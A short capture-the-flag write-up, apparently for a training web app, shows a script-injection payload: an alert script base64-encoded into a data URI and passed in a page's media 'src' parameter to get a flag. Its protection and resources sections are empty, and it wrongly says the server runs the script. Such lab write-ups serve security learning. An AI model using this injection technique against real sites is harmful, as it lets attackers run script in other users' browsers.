# Script Injection

Inspecting the page reveals that the image is acually an HTML object. Knowing this we can pass in the url anything we want and the server should run it.

## How to exploit:

The image should be encode in base 64, we can then take the script:
```bash
<script>alert("Boom!!!")</script>
```

and encode it.

[Base 64 encoding](https://www.base64encode.org/)

Which gives us:
```bash
PHNjcmlwdD5hbGVydCgiQm9vbSEhISIpPC9zY3JpcHQ+
```

Now modify the src value in the url as follows:
```bash
<ip>/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiQm9vbSEhISIpPC9zY3JpcHQ+
```

This gets the server to execute our code and return the flag.


## How to protect against:

This is an example of 

## Resources: